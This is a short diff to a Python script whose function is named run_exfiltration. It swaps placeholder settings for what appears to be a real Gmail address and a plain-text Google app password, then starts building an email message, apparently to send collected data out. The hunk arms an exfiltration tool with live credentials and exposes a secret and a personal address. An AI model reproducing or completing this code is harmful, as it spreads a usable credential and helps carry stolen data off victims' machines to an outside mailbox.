@@ -7,9 +7,9 @@ def run_exfiltration():
 
 #Configuration
 
-    sender_email = "your_email@gmail.com"
-    receiver_email = "receiver_email@gmail.com"
-    app_password = "your_app_password_here" #Generarted from Google account
+    sender_email = "aly.adham2006@gmail.com"
+    receiver_email = "aly.adham2006@gmail.com"
+    app_password = "cnahrnkwixfquafs" #Generarted from Google account
 
     #Creating the email
     msg = EmailMessage()
